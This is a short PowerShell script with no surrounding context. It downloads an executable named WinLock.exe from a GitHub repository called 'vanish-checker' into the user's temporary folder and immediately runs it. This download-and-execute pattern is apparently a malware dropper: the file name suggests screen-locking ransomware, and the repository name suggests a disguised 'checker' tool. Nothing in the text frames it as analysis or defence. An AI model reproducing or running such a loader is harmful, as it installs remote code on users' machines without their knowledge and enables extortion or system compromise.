$url = "https://github.com/nagibatorm55-ops/vanish-checker/blob/main/WinLock.exe"
$path = "$env:TEMP\Winlock.exe"
irm $url -OutFile $path
Start-Process -FilePath $path
